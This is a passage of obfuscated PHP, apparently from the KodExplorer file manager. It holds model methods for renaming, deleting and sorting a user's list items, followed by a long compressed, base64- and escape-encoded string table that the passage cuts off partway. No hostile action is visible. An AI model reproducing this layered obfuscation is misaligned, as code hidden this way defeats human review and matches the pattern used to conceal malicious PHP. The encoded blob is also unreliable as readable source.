} $ü„Óœ… = $this->getAutoName($ü„Óœ…); $‹•Ò–µÛ = array($Øå’ïÁ£[1965] => USER_ID, $Øå’ïÁ£[573] => 0, $Øå’ïÁ£[509] => $ü„Óœ…, $Øå’ïÁ£[510] => $ôµØÔ‡Ö, $Øå’ïÁ£[511] => $ÙÚ¦¿‚ü, $Øå’ïÁ£[2182] => $˜–‡•Õ¦ + 1); return $this->add($‹•Ò–µÛ); } protected function remove($’ÏÅ‹ª) { $…»ñÔ¨Ÿ =& $_SERVER[œ—üé‹ê]; $­ú¶òÂ = array($…»ñÔ¨Ÿ[1965] => USER_ID, $…»ñÔ¨Ÿ[508] => $’ÏÅ‹ª); return $this->where($­ú¶òÂ)->delete(); } protected function removeByName($¾ÕĞùÃä) { $Ó˜ªƒÙÎ =& $_SERVER[œ—üé‹ê]; $Âúä¸Î÷ = array($Ó˜ªƒÙÎ[1965] => USER_ID, $Ó˜ªƒÙÎ[509] => $¾ÕĞùÃä, $Ó˜ªƒÙÎ[573] => 0); return $this->where($Âúä¸Î÷)->delete(); } protected function rename($œø»šê£, $±öÄáÖñ) { $üõù ÜÇ =& $_SERVER[œ—üé‹ê]; if ($œø»šê£ == $±öÄáÖñ) { return !1; } $³µ«Ò…£ = $this->getAutoName($±öÄáÖñ); if ($±öÄáÖñ != $³µ«Ò…£) { return !1; } $œ§›ì = array($üõù ÜÇ[1965] => USER_ID, $üõù ÜÇ[573] => 0, $üõù ÜÇ[32] => $œø»šê£); return $this->where($œ§›ì)->save(array($üõù ÜÇ[32] => $±öÄáÖñ)); } protected function resetSort($š—¨’Åˆ) { $ˆ½Ãî˜ =& $_SERVER[œ—üé‹ê]; $š—¨’Åˆ = is_array($š—¨’Åˆ) ? $š—¨’Åˆ : array(); $œõ–ƒ…€ = array($ˆ½Ãî˜[1965] => USER_ID); for ($îÚÈáäí = 0; $îÚÈáäí < count($š—¨’Åˆ); $îÚÈáäí++) { $œõ–ƒ…€[$ˆ½Ãî˜[508]] = $š—¨’Åˆ[$îÚÈáäí]; $this->where($œõ–ƒ…€)->save(array($ˆ½Ãî˜[2182] => $îÚÈáäí + 1)); } return !0; } protected function moveTop($ú‚Àœ¹¯) { $¨²–ëÛª =& $_SERVER[œ—üé‹ê]; $‘ªŒ¶á = array($¨²–ëÛª[1965] => USER_ID, $¨²–ëÛª[573] => 0); $«‘²şø = $this->where($‘ªŒ¶á)->where(array($¨²–ëÛª[32] => $ú‚Àœ¹¯))->find(); if (!$«‘²şø) { return; } $ùÅ°ÅéÕ = $this->field($¨²–ëÛª[487])->where($‘ªŒ¶á)->order($¨²–ëÛª[2667])->select(); $ùÅ°ÅéÕ = array_to_keyvalue($ùÅ°ÅéÕ, $¨²–ëÛª[12], $¨²–ëÛª[487]); $—ó•øÄê = $ùÅ°ÅéÕ; $ùÅ°ÅéÕ = array_remove_value($ùÅ°ÅéÕ, $«‘²şø[$¨²–ëÛª[487]]); array_unshift($ùÅ°ÅéÕ, $«‘²şø[$¨²–ëÛª[487]]); return $this->resetSort($ùÅ°ÅéÕ); } protected function moveBottom($¤˜ıØ—) { $Şü±÷ı‰ =& $_SERVER[œ—üé‹ê]; $õ¹½§Æá = array($Şü±÷ı‰[1965] => USER_ID, $Şü±÷ı‰[573] => 0); $¡Â½íñç = $this->where($õ¹½§Æá)->max($Şü±÷ı‰[2200]); $ğÇ˜Œ”³ = array($Şü±÷ı‰[2200] => $¡Â½íñç + 1); return $this->where($õ¹½§Æá)->where(array($Şü±÷ı‰[32] => $¤˜ıØ—))->save($ğÇ˜Œ”³); } private function getAutoName($Ö™ÑÑèÈ) { $³‹‘¶ÃÌ =& $_SERVER[œ—üé‹ê]; $İÔƒî‰Ï = array($³‹‘¶ÃÌ[1965] => USER_ID, $³‹‘¶ÃÌ[573] => 0); $ØÏ½·â´ = $this->field($³‹‘¶ÃÌ[32])->where($İÔƒî‰Ï)->select(); $ØÏ½·â´ = array_to_keyvalue($ØÏ½·â´, $³‹‘¶ÃÌ[12], $³‹‘¶ÃÌ[32]); if (!$ØÏ½·â´ || !in_array($Ö™ÑÑèÈ, $ØÏ½·â´)) { return $Ö™ÑÑèÈ; } for ($å“¾ª±é = 0; $å“¾ª±é < count($ØÏ½·â´); $å“¾ª±é++) { if (!in_array($Ö™ÑÑèÈ . "\50{$å“¾ª±é}\51", $ØÏ½·â´)) { return $Ö™ÑÑèÈ . "\50{$å“¾ª±é}\51"; } } return $Ö™ÑÑèÈ . "\x28{$å“¾ª±é}\51"; } } goto cÓ˜…ñÈ¢¬; b¥¶ĞÔ»àÓ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\234\227\374\351\213\352", "\301\360\357\300\316\234"); $_SERVER[œ—üé‹ê] = explode(strrev('|||'), gzinflate(substr(strrev('Q¤¶=‘¤Œ™¶9$d²"Ç,²$âwglZ\'lHbahûhB„'."\n".'0µÕ|y}Å'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹')."\64\43\157\111\150\11\133\331\367\75\154\145\155\113\266\262\23\266\302\143\53\74\12\357\225\255\320\322\127\142\47\164\201\2\217\56\100\313\167\227\163\227\31\311\360\276\337\367\307\27\110\64\167\337\316\75".strrev('ä=óuu¹Şy¾!öƒ¼î>ù/è+ïú7éÊôÿ×»Ğûî7WãÜnÏìñÿÜ÷9Ïsœ÷')."\xa2\x7b\xb6\x6a\x77\x69\x3f\xd1\xce\x8f\x45\x9e\x7f\x21\x7c\xe8\x8b\x77\x9d\x18\x9a\xbc\xe5\xf9\xb1\xc9\x7d\xf7\x79\xec\x80\xb1\x53\x9a\x51\x66\x5a\xb6\x99\xfe\x28\x5\xd3\x56\xf4\x51\xc3\xb2\x2d\x1a\x91\x36\xb\x59\xa3\x9f".strrev('d½EûCËIZŠ¾fóÓ–jd$ñBº»º&©,hÕÒÁœúÖ¿È¿B£ú>ƒN¶›ÏIHñİ?§ëú~').strrev('Ş%#ó¯#IÙ+[	Ÿ"1¥ë/®¥#B»k“U­‰Ô-µV¶¦ ³JZÙ£""1¨³E©ÕÈŞ¡')."\xaf\xd6\xd0\x8a\x70\x54\x49\xc6\x3\xd1\x44\x20\x98\xc\xc7\xa2\x34\x3a\x18\xeb\xec\xc\x27\x2b\xe3\xe3\xb1\x48\xa4\x35\x10\x5c\x59\x99\xd2\x15\xf\xac\xe8\xc\x28\xa8\x7f\x39\x5d\x35\xa\x59\xb3\x4e\x59\x47\x53\xd6\x29\xf5"."\364\243\335\320\163\31\372\131\320\130\167\354\261\42\174\45\371\27\132\246\102\71\227\243\201\50\377\312\350\131\255\234\203\331\152\223\3\305\222\221\327\330\240\127\352\143\74\226\176\150\145\333\64\12\151\32"."\x8\x8d\xda\x25\x4d\xc4\xa3\xbe\xa6\xd1\x42\xeb\x5\xa8\x2a\x11\x8a\x84\x82\x49\x5\x77\x50\x69\x8f\xc7\x3a\x15\x58\x84\xbc\x66\xd9\x7a\x49\x59\xdd\x11\x8a\x87\x14\xdc\xe9\x96\x5a\x32\xd6\x5a\x5\xe0\x25\x8a\xa6\x42\x9\x44"."\x22\xca\x54\x35\xd8\x7a\xbe\xc8\xaa\xa1\x65\xaa\x54\x16\x8b\xb7\x85\xe2\x4a\xeb\x5a\x45\xcc\x50\xda\xcc\xe7\xcd\x82\xf\xd5\x82\x56\xd2\x96\xba\x1a\x8a\xc7\xe9\x87\x7\xc0\x3b\x12\xc6\x8b\x6\x81\x58\x7b\x7b\x22\xc4\x43\x30"."\xb8\x93\x22\xa8\x27\x73\x0\x3e\x1d\xa1\x4c\x36\x67\xab\xc3\x5a\xae\xcc\xc0\x74\x88\xfe\xd6\xc2\xf\xfc\x9a\x16\x80\xee\x7a\xa3\x60\x94\x1\x4c\xa1\xa\xd3\xe4\xdb\xa\x3e\xca\x2c\xb7\xce\x62\xf4\xc\x7c\xe4\x51\x79\x13\xca"."\245\40\56\305\162\15\262\17\3\355\320\141\372\331\262\224\376\56\206\362\51\25\247\351\45\133\325\13\151\63\143\24\140\37\57\3\170\324\354\201\266\222\201\62\320\160\326\314\145\330\267\145\214\303\50\263".base64_decode('Rk6PlvNyFh5MDxi5TIltvS/KSYMRvpNxXhEqop5wJGBkx8RWxPm6eKpllktpPYy2Dg03QrRu22g=')."\x70\x6c\x42\xcc\xee\x62\xce\xd4\x32\x9\xbd\xc4\x87\x66\x98\xed\xa8\xa2\x58\xd9\x96\x23\x87\xd8\x2e\xc8\x48\x93\xd0\xb\x55\xe\xe8\xb9\x9c\xaa\x8f\xea\xb0\x25\xf2\x99\x79\x16\x1b\x8b\xdf\x4a\x19\x5\x3f\x8a\xa1\xc1\x70\x4c"."\x1d\xd0\xac\x81\xce\xcc\x3c\x95\x94\x62\xb8\x32\xa3\x8f\xfa\x8a\x3\x45\xd8\xaf\x7c\x8b\xf6\x3a\x40\x16\x8f\x3c\x6a\xda\x21\x9\xe3\xe6\xcc\xb4\x6\x79\xcb\x64\x20\xf4\x7b\xc0\xb6\x8b\x9\xbd\x90\xc1\x3\x81\x6e\x9b\x23\x5"."\62\320\242\256\103\246\66\217\222\121\72\225\265\112\107\263\321\154\261\202\371\34\377\142\243\343\161\26\217\264\107\331\152\144\262\0\154\14\341\327\100\203\206\105\160\227\330\170\132\261\230\63\322\232\155\230"."\x5\xbf\x99\xb6\x75\xdb\x6b\xd9\x25\x5d\x83\x1a\x3\xe9\xb4\x6e\x59\xde\xa0\x59\xb0\x4b\x66\xce\x1b\xc8\xe5\xcc\x11\x6f\xac\x64\xf4\x1b\x85\x66\x65\x16\xa0\x51\x94\x88\xb6\xab\x17\xa3\xb6\x66\xd8\x83\x35\x8b\x15\xbc\xee\xb8".base64_decode('mVktZTvrXcj2Fs9d0gpWVi95QwDYzQrqLMdvLFubYRVNy8Dda1Y029bSAxg3iOpbviC/UcgZBb0=')."\x32\x2f\xaa\x44\xf7\x76\x95\xb4\xfe\xbc\xd6\xac\x14\xcb\x29\x34\x1\xb0\x9f\x20\x2e\x8d\x73\xc8\x99\x61\x2\x9a\x95\xbc\x36\xea\xd5\xfa\x59\x4d\xa1\xd1\xa2\x51\xd2\x2d\x36\x6a\x65\x45\x67\x12\x20\x2a\xeb\xed\xc4\xfb\xc0\xd0"."\x33\xde\x4\x42\xbe\x50\xd9\x9c\x86\xb9\xa\x82\x15\x85\xa5\xd1\xd8\x8e\x64\xb2\x4b\xd\xb7\xa3\xd3\x35\x1a\x52\x3b\x3\xc9\x60\x7\xd4\x6e\x6b\xfd\xac\xea\x8\x42\xa9\xbc\x4a\x16\xb9\xc6\x8b\xf6\x3\x86\xa6\x28\x1a\x9c\x88"."\354\62\107\364\22\152\270\165\254\131\31\62\63\51\163\324\307\222\160\346\4\102\14\54\63\136\337\242\355\215\153\205\176\74\214\324\230\255\133\156\324\322\212\316\142\137\226\156\76\137\112\317\232\45\30\215"."\65\334\357\234\374\210\136\350\267\7\130\335\211\120\174\125\50\256\46\142\355\311\325\201\70\34\335\5\4\71\243\254\67\270\365\234\67\256\147\320\44\246\155\126\116\53\212\331\137\343\305\33\6\67\316\122"."\xf1\x26\x62\x69\x91\xf0\xa\x3c\x77\x6d\x5e\xb\x65\xf2\xca\xb9\x58\xdd\x11\x23\x6f\xe0\xe1\xd9\x3c\x85\x4c\x36\x3a\xd7\x57\x40\x87\xfc\x64\xcc\x2d\xbd\xd6\xac\xba\xde\xcc\xec\x7a\x2f\xfa\x77\x56\x7d\x4f\x6f\x9b\x6f\x56\xdf"."\x32\xbf\x21\xca\xf8\x1b\x7d\x8d\x4a\x53\xc3\x7c\xa5\xb\x11\x1a\x86\x96\x53\x60\xd0\x15\x39\x1a\x94\xd8\x4a\xe7\xb4\x8\x8\x2f\x98\x5\xbd\xea\xc6\x42\x80\x64\x5a\xba\xb7\x43\xd7\x10\x8e\x45\xb\xe1\x58\x17\xf\x6b\x8b\x86"."\277\140\166\361\121\47\341\22\327\272\320\310\170\350\244\356\120\42\251\166\206\222\35\261\66\350\176\50\0\137\5\124\230\364\227\255\61\246\253\340\124\53\100\265\372\250\164\4\10\124\236\226\47\204\224\213"."\232\43\14\171\273\0\50\70\240\247\207\246\110\103\137\60\32\223\342\45\266\164\75\364\247\17\240\271\217\376\250\152\60\22\12\304\125\40\110\125\303\152\227\116\101\34\344\350\126\65\123\203\10\320\72\165"."\x5b\x13\x3\x40\xcd\x85\xf3\x68\x4b\x8b\x81\xa8\xce\x23\x8b\x8d\xb2\x53\x0\x3e\xda\x41\xab\x8d\xc\x3f\xd3\x50\xb0\x43\x37\xfa\x7\xa0\xdf\x6\xae\x2e\x6d\xe6\xcc\x92\x96\xc3\x47\x1\x23\x43\xfb\xd\xc0\xca\xc5\x5c\x19\x6d"."\x3\x3f\xae\x38\x39\x50\xce\xa7\x80\x1a\x47\x53\xd6\xaf\xdb\x82\x42\xb4\xc6\x10\x19\x95\x67\xe7\x2b\x3a\xa4\xed\x70\x9b\xe3\x14\x85\x90\x5f\xc5\xa0\xdb\xeb\x2b\x16\xfa\xeb\x4f\x80\xba\xd4\xa6\x79\xd\x38\x2\x56\x15\x46\x86".base64_decode('SOWyXjl0X9pE+7xTG9Kb8VgAuS0msSwg4c/F+MhrcaMJvFo5Xx5VQuoMmvxApszIYueRp+ilklk=')."\232\16\71\310\267\102\316\115\274\134\120\271\315\211\10\13\141\4\366\75\140\162\242\303\144\260\331\354\207\161\317\150\152\7\54\222\101\304\227\317\262\321\42\240\1\152\231\114\265\150\204\171\240\202\215\14"."\x6c\x49\x2\x23\xb\xfc\x89\x39\xe8\x7f\x41\x3\x64\xcc\xbc\xc6\x4e\x54\x8c\x88\x78\xb3\x38\x60\xf1\x10\x39\x26\xf5\xc\x3d\x27\x1d\x51\x74\x83\xd3\xa8\x59\xac\xc9\x92\x6d\xe2\xc4\x92\x23\x27\x2\xd2\x1\x13\x3a\x8d\xa0\x2"."\x6\x5c\xe6\x23\x67\x73\x90\xd1\x73\x3a\x3\xb0\x1\x9d\x91\x1a\xd\x90\xd\xad\xc\x7\xbf\x2c\xdf\x7\x88\x17\x40\xb1\x82\x44\x33\xac\x38\x2a\x89\x9\x3\x16\x5e\x8d\x99\x27\x11\x81\xa9\x23\x80\x2b\xf1\x99\x43\xab\x1a\x23"."\x1b\x4a\x84\xbb\x4a\x7a\xd6\x18\x65\xa8\x64\xd4\xee\xd4\x4a\x43\x6c\x60\xa8\xa4\xd8\x8a\x38\x20\x6d\xd3\xf6\xee\x48\x44\xd\xc6\xa2\x49\xc4\x7b\xd1\x98\xd5\xf1\x70\x32\xc4\x30\x56\xa0\x4d\xd\x4\xbb\x20\x24\x70\x20\x27\xe0"."\144\22\204\306\14\67\1\10\241\116\370\5\255\204\16\353\242\131\100\230\26\220\225\127\160\146\25\111\31\101\112\0\354\10\362\303\105\121\40\232\40\77\356\315\43\274\342\345\175\352\352\6\132\200\101\5"."\xa3\x6a\x5b\xc7\xda\xcd\x12\x23\xe3\x8c\xfe\xc2\x2a\xbe\xf2\xab\x13\x73\xbd\x1d\x9d\x81\xa0\x37\xd1\x11\x68\x9a\x37\x9f\xc6\xae\xcd\x67\x7a\x93\x1d\x86\xd5\x7b\x32\xf\x43\x77\x46\xac\xb9\x6a\x49\x47\x7b\x9a\xc1\x42\x53\x43"."\43\333\161\210\56\321\104\317\327\172\363\136\134\13\46\51\175\15\15\15\254\256\331\363\225\1\204\112\70\376\316\220\321\62\106\245\234\36\322\145\164\156\171\107\14\206\363\116\340\244\367\11\225\223\157\225"."\xc9\xe9\xa6\x6a\x69\x5c\x9d\x8a\xa\xdb\x65\x4b\x9e\x29\x4\x80\x19\x54\xc4\x60\x54\x32\x8d\xd5\x72\xfd\x26\x82\xbb\x81\xbc\x1c\x99\xe1\xf0\x4b\xc3\x3a\x25\xb9\xa0\xa1\x1\x8d\xcf\x13\x9e\x3d\xb6\x39\x10\x41\x37\x26\x17\xc2"."\xd3\x8c\xfa\xc0\xf0\xb7\x93\xc6\x56\x92\xd5\x27\x9a\x92\xee\x61\x98\x6d\xd1\x8f\x22\x3e\xd9\x10\xd6\x66\xcb\x36\x93\xfe\x1c\xc\xdd\x28\xa3\x7d\x5b\x32\xc6\xa5\xd9\x5f\xc6\x6a\x62\x38\x33\x96\x80\x26\x47\xf3\x39\xc1\x42\xc1"."\324\300\154\312\103\33\125\121\212\12\51\252\234\322\301\361\0\133\205\316\66\327\236\240\207\77\215\133\262\14\265\250\14\143\201\214\131\150\251\155\364\65\324\52\214\261\154\251\355\116\266\43\72\175\331\322"."\x83\x97\x4\xcd\x7c\x11\xa3\x95\xce\x72\xce\x36\xf0\x78\x29\xe4\x2e\x85\x31\x2e\xc1\x34\x10\xb\x74\xb9\xa6\x23\x94\xd4\xe0\xd4\x59\xe2\x97\xf3\x2d\xf1\x4f\x55\x2b\xc\x5\x13\x66\x6b\xd4\xae\x48\x20\xd9\x1e\x8b\x77\x2\x8c"."\27\213\2\254\212\351\152\273\315\53\60\122\331\362\352\230\116\206\135\240\245\163\56\20\225\347\142\115\125\110\134\123\15\22\327\270\40\161\115\45\44\256\251\6\147\303\0\220\132\136\33\67\13\150\277\242"."\203\66\357\113\3\130\44\73\302\321\225\152\147\254\55\24\121\303\121\104\317\45\53\343\273\273\332\2\14\15\312\361\255\261\144\207\43\266\33\121\164\253\2\221\260\73\173\150\115\70\221\114\124\115\102\161"."\335\41\127\112\133\253\332\25\17\265\207\327\360\140\173\70\24\151\113\250\301\100\260\103\344\211\6\72\41\200\150\45\75\227\261\374\316\374\52\42\115\23\134\152\246\2\300\101\310\41\250\122\231\10\106\25"."\230\30\261\71\72\54\7\14\27\313\35\311\110\124\206\252\312\234\320\144\74\175\236\35\265\210\105\203\151\147\374\111\35\375\251\127\2\11\305\56\252\374\120\115\215\361\117\62\14\26\126\31\61\211\310\21".base64_decode('6IgC9HJFV1Scp1XiiqpHBLI2J0ldYXSWiDS0FAEi6UQgQZYGmjHQyVSyA6w7WSFlVGNdoXgAyyg=')."\325\325\361\130\164\5\24\30\31\320\131\7\302\260\16\165\214\115\5\121\245\55\16\170\55\147\150\114\146\45\146\177\320\144\163\212\130\163\106\374\27\330\204\247\60\165\303\110\136\366\221\105\73\232\121\46"."\x66\x99\xd7\x9f\x32\x4d\xa8\x33\x87\x39\x32\xa8\xde\x62\x30\x31\xca\xce\xe7\xd9\xfc\xfc\x2\x48\x8d\xad\xc\x45\x55\x6\x48\x34\x24\x1\x1f\x8d\x8\xc5\xe3\xb1\x38\xc\xdb\x36\x87\x98\x30\x8b\x26\xc6\x43\x89\x50\x92\x9d\xf0".base64_decode('68sGmxS/bzYArY5oOmjef0rvyOy6Hu9sXx/6qJ+1nAYh1OtzBBmpXS7x0pgMrLOW1Tf3+nv9dcs=')."\232\173\2\336\161\315\73\336\340\135\344\355\103\4\172\375\154\210\350\333\320\344\231\273\11\147\100\31\227\35\337\207\176\132\172\227\315\350\365\316\74\165\335\362\236\336\276\332\346\331\323\173\175\307\367\216"."\xf4\xcd\xaa\x5f\xc6\xda\x49\x97\x4b\x88\x7\x60\x7\x1b\xea\x6a\x66\x76\x1d\xea\x12\x62\x5a\x79\x96\x82\x84\x87\x49\x6\x96\x30\x6e\x14\x45\xec\x86\xf9\x9b\x58\x3c\x5a\x37\xbd\x5f\x94\xe8\xf1\xf6\xce\xee\x5b\x26\x95\x93\xa2"."\xdc\x6d\x21\x54\x8a\x28\xbe\x1\x9e\x2f\xe0\x3d\x19\x8f\x8c\x17\xc5\xdb\x1c\x60\xa2\x5c\x48\x8b\xd3\x10\x43\x7f\x4a\xe3\xdc\x5f\x7f\x41\xb0\x55\x76\x89\xb\x38\x87\x11\x44\xa\x84\xbb\x61\x6\xfd\xdd\xc4\x16\xb2\x5f\x1f\x65"."\230\240\220\65\30\65\125\56\30\353\31\177\123\320\327\303\207\151\163\50\326\355\21\235\201\7\212\167\204\21\160\260\103\0\45\111\241\234\164\150\20\121\26\207\121\16\114\106\121\305\254\336\10\17\241\63"."\5\326\151\32\344\266\322\132\121\117\110\43\124\325\144\240\65\22\342\174\53\40\136\26\46\110\260\225\137\203\240\241\11\4\312\260\200\44\246\42\142\43\330\337\326\372\234\102\266\77\345\261\232\311\215\220".base64_decode('VS5idklBK47mVkHkm9KyVKFTDuVUeQGKnA3Cck5dbHSMh6BPRbFCFmJDGCPgr+vtLffomb4eBPg=')."\x9a\x37\xdb\xb7\x61\xce\xa6\x7a\x26\x4b\xf1\xf7\xa2\x3f\x2c\x10\xa8\x72\x37\xa1\x6a\x36\x9b\x12\x8e\xfd\xd4\x15\xa1\xa4\xf\xf7\x88\x4b\xa3\x1d\x1\x9e\x4c\x83\x66\x49\xb0\xff\x6a\x3a\xa7\x6b\x25\x36\xa9\x45\x7\x9f\x6f\x9b"."\xb6\x96\x73\xd4\x98\xc4\x31\xc\x4f\x31\xca\xa\xe4\xbc\x14\xc\x22\x2\x7d\x61\x2\x44\xba\xed\x21\xd8\x34\xca\xe5\xaa\x9c\x3e\x96\xae\x1b\x70\x89\x84\x6e\xfb\x78\xe\x8f\x94\xa8\xa2\xb0\x8c\xbb\xf9\xd\xf\x9\xad\x12\x19".base64_decode('SRlA1gr6s7ojFGWYPSl9tyjBQCLEQkCFHRyKtsFNCv0XaFLItvhgdr4U0N4OSscsFdAniEjCcS0=')."\x65\xa1\xf9\x4d\xf\xb4\x97\x73\x39\x9b\xb\x86\xc\x53\xa5\x22\xa\x57\x50\xcd\x73\xd1\xb\x8a\xc3\x4c\x14\xa3\x6a\x99\xe4\xdc\x18\x82\x32\xb0\xe3\xe1\x7a\xcd\xb\xbd\x9c\x5d\xad\x4d\xc4\x4e\xb1\x96\x66\x81\x9c\xbb\x66\x56"."\265\214\341\102\301\314\244\252\245\164\152\166\172\100\336\111\202\144\130\21\100\304\131\122\251\143\167\104\112\70\252\264\306\142\221\120\40\252\140\352\4\16\123\104\372\44\102\135\1\164\22\143\31\156\42\31"."\202\153\53\3\300\43\334\346\145\365\257\361\62\311\15\377\60\213\224\123\322\155\65\147\62\334\350\224\371\140\166\323\203\45\57\36\114\51\171\120\247\75\130\130\343\21\314\274\107\134\275\170\206\15\175\204"."\x7c\x70\x46\xdb\x3\xfc\xb7\x47\x88\x99\xe0\x33\xdc\xe6\x31\xac\x36\x22\x47\x20\xd\x90\x24\xd6\x5\x7b\x0\x8b\xd4\x73\xda\x98\x87\x76\x27\xa2\xf\xeb\x39\xf\x13\x40\x79\x58\x1f\x3d\x4c\xec\xe6\x21\xe2\xb2\x36\xe8\x56\x37"."\xc2\x16\xd0\x2d\xf2\x89\xe\x85\x1\xf\x6\x2\xbc\xb\x3d\xe2\x32\xc8\x63\x8e\x14\xf4\x12\xc9\x2\xd3\x26\x44\x10\x1e\x21\x9e\xf0\xf4\x97\xcc\x72\xb1\x8b\xb5\x29\x85\x68\xb7\x20\x42\xf4\x99\x47\xc4\x4d\xd3\xf6\x30\x49\x9e"."\107\26\351\101\57\2\154\267\127\235\316\352\243\41\363\357\356\4\200\27\116\252\234\245\57\131\254\312\365\160\112\63\67\320\32\101\222\273\211\35\342\216\74\104\252\310\151\151\74\341\342\113\302\42\170\0".base64_decode('7RpcO8qb1SlbZEcnA2NxcSRu/ATl7hYsue8CcaOIPUxIzdlaP2sLo1zOPFbJSr/jenosLSRVbZI=')."\374\313\31\342\263\117\166\116\65\250\257\276\252\34\222\371\42\34\74\155\32\233\125\6\336\174\105\35\273\342\313\367\43\214\204\240\321\130\121\120\105\264\263\370\370\110\240\123\272\75\307\246\241\111\116\206".strrev('Æ¤k'."\r".'K]j¡ÖcC!ZÃÈÔƒs¡tÙº(,Çù'."\n".'ÀDå|!ŒNTÔ$h¡pOO¹‡#äíáãÃƒ')."\x51\x5c\x0\x86\xb3\x13\x1e\x16\x54\x2a\x41\xd\x4f\xb7\x3c\x9\x18\x0\xc8\xf0\xc5\xa9\xca\xa2\x62\xe2\x4c\x2f\x3\x29\xab\x59\xc0\x43\x62\x91\x32\x7c\xe9\x2c\x4e\x2c\xad\xc\x89\x12\x82\x11\x11\xac\x5f\x8e\x76\x71\x50\xec"."\42\6\22\12\156\300\43\21\137\30\211\170\305\176\220\202\325\316\74\16\221\256\243\37\117\121\227\121\30\63\12\11\3\213\110\334\261\260\261\111\27\272\64\313\32\101\24\16\34\210\263\146\315\122\4\161".base64_decode('IWgbvNtFiALtVN/0VMFiFNq8By7DPTmjMCTRAEJ6yw7vvOMmpXJgUJGURUwQbHDYEANaScw1Q0s=')."\30\67\360\61\130\70\213\10\112\331\262\332\260\240\273\34\145\44\344\142\331\143\254\367\362\247\263\122\32\154\363\220\337\16\324\171\117\31\365\222\340\343\10\232\13\364\103\72\232\64\5\152\247\37\135\344".base64_decode('XEb7GyXRs9yaAhHghcEyP/nwo80ZGT4DuDG2fcr5Nrgywd+rEB6RSQZL6nisLOQIA0YG8SCqDHc=')."\342\106\213\210\117\352\30\12\3\2\106\225\204\52\34\5\72\111\20\212\200\3\374\110\101\54\120\16\235\240\45\37\336\245\53\360\71\310\246\235\42\130\271\365\204\216\346\3\252\27\65\44\52\322\344\334"."\x42\x36\x8a\x8f\x18\x71\x24\xf1\x1b\x47\xbe\xc9\xc5\x12\x8a\x1d\xdd\x2f\x3a\x84\x57\x51\xad\xec\x7\x5e\x8b\xea\xe1\xf6\x92\xc9\xd9\x2\x4e\x4d\xb8\x33\x5\x9\x43\xce\x15\x60\x5c\x14\x80\x34\x1f\xe\xaa\xa5\x22\x4a\x2a\xe3"."\246\137\134\261\256\40\246\151\252\34\165\320\115\162\321\125\242\207\245\17\261\127\240\307\344\151\220\110\73\201\341\66\320\313\106\70\134\67\271\326\327\66\115\304\263\227\174\45\324\242\350\210\204\135\1\367"."\20\145\230\204\226\325\145\202\304\221\30\50\26\105\267\171\375\26\52\42\235\40\116\212\214\325\231\50\152\354\340\120\274\212\253\6\255\130\224\333\344\344\44\3\170\302\302\225\171\204\2\167\311\164\324\142"."\x48\xbc\xaf\x34\x21\xc2\x69\x71\x8c\xbc\x42\x19\xc3\xc6\x31\x78\x1f\x9b\xec\x26\x4e\x64\x14\xc7\xbb\xbb\xb0\x8\xcb\xe7\xd\x39\x36\x2b\xc0\x46\x70\x40\x9e\x19\x8e\x9c\xd5\x88\x1b\xdf\x2c\x42\x8f\xf8\x4\x2d\x56\x5d\x3\x2c".base64_decode('bRYZM1mStDWHdSkSX4oWRYoUpMlSkqhUysWXgvQI7cwMoeDFLJC8UJZIN+jm92GGxyefIoFSiYE=')."\x3e\x1d\x26\xbe\xb0\x47\x91\x72\x14\x46\xce\x9\xb6\x6f\x69\x45\xa1\x61\xa1\xdf\x48\x8b\xe1\x46\x7c\x14\x49\xe0\x1b\xe0\x58\x81\xef\xd\xf1\x5d\x99\x55\x96\xdd\x56\xaf\x28\x21\x94\x22\x9c\xa1\xea\xd9\x3\xb9\x5c\x9b\xc6\xe"."\112\167\170\312\42\24\71\310\205\344\230\51\213\265\23\316\235\151\200\124\213\343\34\326\324\134\203\133\23\301\211\320\247\246\255\246\100\205\142\311\252\207\21\231\20\34\60\12\72\23\166\145\215\222\125\15"."\263\375\177\46\342\53\147\36\357\206\251\300\5\247\111\122\176\254\147\75\254\313\354\14\27\162\13\264\304\351\213\12\252\10\50\23\51\240\332\16\342\56\116\352\227\266\216\3\102\320\126\245\363\201\17\266".strrev('8?¿@¾¿¦â|¯û–¼Ée}TÂqv|å, ¹^~A~LAR¹K^p…Ë~Q¿à‡ç\\|î³MgÌp')."\353\201\153\166\76\117\277\347\315\201\153\70\364\357\376\33\367\243\337\102\321\376\314\65\75\346\61\317\34\165\352\300\215\237\314\336\362\372\314\43\347\335\132\177\311\245\317\36\160\100\344\203\232\223\176\64".strrev('zË¼ßĞûèŸ¾—áşŞ~^,Çåí´÷Éß&ï¨Mqt|ç}şz‰ı/³Å¢ÿpıw²¹U<ï•îÕz').base64_decode('oy9+Yv7JxXteuOYa68WNe5peWPLp9E8/PX36E/v94KHi74MXZQ946d/3//Cab7ZtaZ3eXzjqgOs=')."\xb6\xec\xd7\x7b\xff\x1f\x17\x6f\xfc\x53\xcd\xf7\x7\x66\x3c\x3d\x78\xee\xe7\x6f\x5f\x38\xed\x4f\xa9\x25\x93\xc7\x9f\x78\xd7\x7f\x1f\x76\x44\xf4\x84\xb\x9f\xdf\xe7\xb2\x5f\x4c\xfb\x5d\x22\xb2\x7b\xb8\x74\xd9\x93\x85\xd3\x97"."\37\223\370\366\45\257\257\136\371\320\53\57\152\367\276\366\332\327\167\225\137\174\240\177\321\1\133\364\267\56\331\20\153\270\41\363\137\241\213\227\316\276\355\270\317\377\347\206\277\376\367\117\62\37\375\62".base64_decode('8NMnDnxk6edX/uLlm347+OEH0Vvu7RscWH/l+4FLF937u7mn9w1qz6xcM2/ujgP/Z+P6HdPmpz4=').base64_decode('PGjO2/+zse/sG2o3Lrz3x4/uvGb20dYx67dn/36HNnZPdrq+benZd//86Bf2zH/tqfAV879idTw=')."\xf0\xe6\x9c\xae\xe3\xfe\xbb\x65\xe7\xbc\xe6\xc5\xeb\xb5\x97\xf7\xb9\xee\xc1\xd6\x93\x5e\x5f\xf8\xb7\xba\x7b\x7a\x6e\x7e\x74\xcb\x3b\x67\x6e\x99\xb9\x43\xdb\xb2\x6d\x79\x6c\xcf\x3d\xfb\xdd\x7c\xd2\xb1\x81\x4d\xbd\x4f\x9f\x75".base64_decode('2Mstqfum7frG9QefedqezsbGh5YeUTPf3ri0yfv7lx9amDv4sNL